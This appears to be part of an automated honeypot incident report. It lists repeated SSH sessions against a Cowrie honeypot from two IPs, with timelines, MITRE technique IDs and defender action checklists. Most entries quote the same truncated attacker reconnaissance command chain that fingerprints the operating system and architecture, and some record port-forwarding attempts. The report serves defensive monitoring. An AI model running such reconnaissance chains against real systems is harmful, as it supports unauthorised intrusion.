| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:46 |
| **Last Seen** | 2026-09-01 15:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:46:27` | `cowrie.session.connect` |
| `2026-09-01 15:46:27` | `cowrie.client.version` |
| `2026-09-01 15:46:27` | `cowrie.client.kex` |
| `2026-09-01 15:46:28` | `cowrie.login.success` |
| `2026-09-01 15:46:30` | `cowrie.session.params` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.success` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.command.input` |
| `2026-09-01 15:46:30` | `cowrie.log.closed` |
| `2026-09-01 15:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b3103d776e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:48 |
| **Last Seen** | 2026-09-01 15:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:48:20` | `cowrie.session.connect` |
| `2026-09-01 15:48:20` | `cowrie.client.version` |
| `2026-09-01 15:48:20` | `cowrie.client.kex` |
| `2026-09-01 15:48:21` | `cowrie.login.success` |
| `2026-09-01 15:48:23` | `cowrie.session.params` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.success` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.command.input` |
| `2026-09-01 15:48:23` | `cowrie.log.closed` |
| `2026-09-01 15:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3b22b24eae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:50 |
| **Last Seen** | 2026-09-01 15:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:50:16` | `cowrie.session.connect` |
| `2026-09-01 15:50:16` | `cowrie.client.version` |
| `2026-09-01 15:50:16` | `cowrie.client.kex` |
| `2026-09-01 15:50:17` | `cowrie.login.success` |
| `2026-09-01 15:50:18` | `cowrie.session.params` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.success` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.command.input` |
| `2026-09-01 15:50:18` | `cowrie.log.closed` |
| `2026-09-01 15:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0050621f01ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:52 |
| **Last Seen** | 2026-09-01 15:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:52:15` | `cowrie.session.connect` |
| `2026-09-01 15:52:15` | `cowrie.client.version` |
| `2026-09-01 15:52:15` | `cowrie.client.kex` |
| `2026-09-01 15:52:16` | `cowrie.login.success` |
| `2026-09-01 15:52:17` | `cowrie.session.params` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.success` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.command.input` |
| `2026-09-01 15:52:17` | `cowrie.log.closed` |
| `2026-09-01 15:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd2139691e3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:53 |
| **Last Seen** | 2026-09-01 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:53:59` | `cowrie.session.connect` |
| `2026-09-01 15:53:59` | `cowrie.client.version` |
| `2026-09-01 15:53:59` | `cowrie.client.kex` |
| `2026-09-01 15:54:00` | `cowrie.login.success` |
| `2026-09-01 15:54:00` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:54:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:54:00` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1918995b561d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:54 |
| **Last Seen** | 2026-09-01 15:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:54:24` | `cowrie.session.connect` |
| `2026-09-01 15:54:24` | `cowrie.client.version` |
| `2026-09-01 15:54:24` | `cowrie.client.kex` |
| `2026-09-01 15:54:25` | `cowrie.login.success` |
| `2026-09-01 15:54:26` | `cowrie.session.params` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.success` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:26` | `cowrie.command.input` |
| `2026-09-01 15:54:27` | `cowrie.log.closed` |
| `2026-09-01 15:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868a90365394

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:55 |
| **Last Seen** | 2026-09-01 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:55:36` | `cowrie.session.connect` |
| `2026-09-01 15:55:36` | `cowrie.client.version` |
| `2026-09-01 15:55:36` | `cowrie.client.kex` |
| `2026-09-01 15:55:37` | `cowrie.login.success` |
| `2026-09-01 15:55:37` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:55:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:55:37` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99fbc15cf441

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:56 |
| **Last Seen** | 2026-09-01 15:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:56:14` | `cowrie.session.connect` |
| `2026-09-01 15:56:14` | `cowrie.client.version` |
| `2026-09-01 15:56:14` | `cowrie.client.kex` |
| `2026-09-01 15:56:16` | `cowrie.login.success` |
| `2026-09-01 15:56:18` | `cowrie.session.params` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.success` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.command.input` |
| `2026-09-01 15:56:18` | `cowrie.log.closed` |
| `2026-09-01 15:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9559240ea78

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:57 |
| **Last Seen** | 2026-09-01 15:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:57:53` | `cowrie.session.connect` |
| `2026-09-01 15:57:53` | `cowrie.client.version` |
| `2026-09-01 15:57:53` | `cowrie.client.kex` |
| `2026-09-01 15:57:55` | `cowrie.login.success` |
| `2026-09-01 15:57:57` | `cowrie.session.params` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.success` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.command.input` |
| `2026-09-01 15:57:57` | `cowrie.log.closed` |
| `2026-09-01 15:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c035dc27afcd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:59 |
| **Last Seen** | 2026-09-01 15:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:59:36` | `cowrie.session.connect` |
| `2026-09-01 15:59:36` | `cowrie.client.version` |
| `2026-09-01 15:59:36` | `cowrie.client.kex` |
| `2026-09-01 15:59:38` | `cowrie.login.success` |
| `2026-09-01 15:59:39` | `cowrie.session.params` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.success` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.command.input` |
| `2026-09-01 15:59:39` | `cowrie.log.closed` |
| `2026-09-01 15:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5c4b00ac6b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:01 |
| **Last Seen** | 2026-09-01 16:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:01:30` | `cowrie.session.connect` |
| `2026-09-01 16:01:30` | `cowrie.client.version` |
| `2026-09-01 16:01:30` | `cowrie.client.kex` |
| `2026-09-01 16:01:31` | `cowrie.login.success` |
| `2026-09-01 16:01:32` | `cowrie.session.params` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.success` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:32` | `cowrie.command.input` |
| `2026-09-01 16:01:33` | `cowrie.log.closed` |
| `2026-09-01 16:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5900cecbe98e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 16:03 |
| **Last Seen** | 2026-09-01 16:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:03:23` | `cowrie.session.connect` |
| `2026-09-01 16:03:24` | `cowrie.client.version` |
| `2026-09-01 16:03:24` | `cowrie.client.kex` |
| `2026-09-01 16:03:25` | `cowrie.login.success` |
| `2026-09-01 16:03:26` | `cowrie.session.params` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.success` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:26` | `cowrie.command.input` |
| `2026-09-01 16:03:27` | `cowrie.log.closed` |
| `2026-09-01 16:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44867e759a16

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:04 |
| **Last Seen** | 2026-09-01 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:04:42` | `cowrie.session.connect` |
| `2026-09-01 16:04:42` | `cowrie.client.version` |
| `2026-09-01 16:04:42` | `cowrie.client.kex` |
| `2026-09-01 16:04:43` | `cowrie.login.success` |
| `2026-09-01 16:04:43` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:04:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:04:43` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-574d5e1a91f9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:05 |
| **Last Seen** | 2026-09-01 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:05:04` | `cowrie.session.connect` |
| `2026-09-01 16:05:04` | `cowrie.client.version` |
| `2026-09-01 16:05:05` | `cowrie.client.kex` |
| `2026-09-01 16:05:06` | `cowrie.login.success` |
| `2026-09-01 16:05:06` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:05:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:05:06` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

